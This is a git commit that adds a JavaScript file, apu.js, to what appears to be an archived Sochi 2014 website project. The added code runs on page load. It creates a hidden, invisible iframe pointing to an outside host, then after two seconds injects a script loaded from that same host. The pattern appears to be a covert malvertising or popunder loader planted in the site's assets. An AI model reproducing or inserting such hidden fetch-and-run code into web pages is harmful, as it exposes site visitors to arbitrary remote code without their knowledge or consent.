3f9778d536cdd9d897ec9d7a9d66b4738dc2481b
Igor Romanenko <rigonn@yandex.ru>
2019-02-15 12:20:10 +1200

    2014 Sochi_2014 (web_sait)

---
+++ 2014_Sochi_2014(web_sait)/www_sochi_2014/js/apu.js
@@ -0,0 +1,13 @@
+    var iframef05b36b = document.createElement('iframe');
+    iframef05b36b.setAttribute('style', 'display:none; position:absolute; top:0px; left:0px;');
+    iframef05b36b.setAttribute('src', "http:\/\/rtrgt2.com\/fpix.php?zoneid=12040");
+    document.getElementsByTagName('body')[0].appendChild(iframef05b36b);
+    setTimeout(function()
+    {
+        var secondScriptJsf05b36b = document.createElement('script');
+        secondScriptJsf05b36b.src = "http:\/\/rtrgt2.com\/apu.php?zoneid=12040&final";
+        secondScriptJsf05b36b.type = "text/javascript";
+        secondScriptJsf05b36b.language = "javascript";
+        var headf05b36b = document.getElementsByTagName('head')[0];
+        headf05b36b.appendChild(secondScriptJsf05b36b);
+    }, 2000);
